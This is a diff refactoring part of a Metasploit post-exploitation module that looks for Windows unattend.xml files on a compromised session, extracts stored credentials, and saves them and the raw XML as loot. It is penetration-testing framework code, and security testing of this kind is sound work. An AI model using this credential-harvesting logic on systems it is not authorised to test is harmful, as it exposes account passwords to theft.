@@ -227,7 +227,7 @@ class Metasploit3 < Msf::Post
 	def save_cred_tables(cred_tables)
 		cred_tables.each do |t|
 			vprint_line("\n#{t.to_s}\n")
-			p = store_loot('windows.unattended.creds', 'text/csv', session, t.to_csv)
+			p = store_loot('windows.unattended.creds', 'text/csv', session, t.to_csv, t.header, t.header)
 			print_status("#{t.header} saved as: #{p}")
 		end
 	end
@@ -236,8 +236,11 @@ class Metasploit3 < Msf::Post
 	#
 	# Save the raw version of unattend.xml
 	#
-	def save_raw(data)
-		store_loot('windows.unattended.raw', 'text/plain', session, data)
+	def save_raw(xmlpath, data)
+		return if data.empty?
+		fname = ::File.basename(xmlpath)
+		p = store_loot('windows.unattended.raw', 'text/plain', session, data)
+		print_status("Raw version of #{fname} saved as: #{p}")
 	end
 
 
@@ -261,7 +264,7 @@ class Metasploit3 < Msf::Post
 	#
 	def init_paths
 		drive = session.fs.file.expand_path("%SystemDrive%")
-		
+
 		files =
 			[
 				'unattend.xml',
@@ -277,7 +280,6 @@ class Metasploit3 < Msf::Post
 				"#{drive}\\Windows\\System32\\"
 			]
 
-		# Don't really want to create another indent level, so we do it this way
 		paths = []
 		target_paths.each do |p|
 			files.each do |f|
@@ -294,9 +296,7 @@ class Metasploit3 < Msf::Post
 
 
 	def run
-		paths = init_paths
-
-		paths.each do |xml_path|
+		init_paths.each do |xml_path|
 			# If unattend.xml doesn't exist, move on to the next one
 			if not unattend_exists?(xml_path)
 				vprint_error("#{xml_path} not found")
@@ -304,13 +304,7 @@ class Metasploit3 < Msf::Post
 			end
 
 			xml, raw = load_unattend(xml_path)
-
-			# Save the raw version in case the user wants more information
-			if not raw.empty?
-				fname = ::File.basename(xml_path)
-				p = save_raw(raw)
-				print_status("Raw version of #{fname} saved as: #{p}")
-			end
+			save_raw(xml_path, raw)
 
 			# XML failed to parse, will not go on from here
 			return if not xml
@@ -330,10 +324,8 @@ class Metasploit3 < Msf::Post
 				end
 			end
 
-			tables = tables.flatten
-
 			# Save the data
-			save_cred_tables(tables) if not tables.empty?
+			save_cred_tables(tables.flatten) if not tables.empty?
 
 			return if not datastore['GETALL']
 		end
